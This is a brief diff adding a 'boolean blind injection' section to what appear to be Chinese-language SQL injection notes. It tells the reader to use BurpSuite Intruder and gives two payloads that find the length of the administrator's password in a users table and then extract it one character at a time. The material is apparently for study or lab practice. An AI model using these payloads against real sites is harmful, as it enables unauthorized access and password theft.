@@ -62,6 +62,15 @@ SELECT a, b FROM table1 UNION SELECT c, d FROM table2
 
 #### 布尔盲注
 
+使用BurpSuite的Intruder设置payload:
+
+```sql
+// 读密码，先确定密码长度
+'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+// 再读取各个字符串
+'AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+```
+
 
 
 
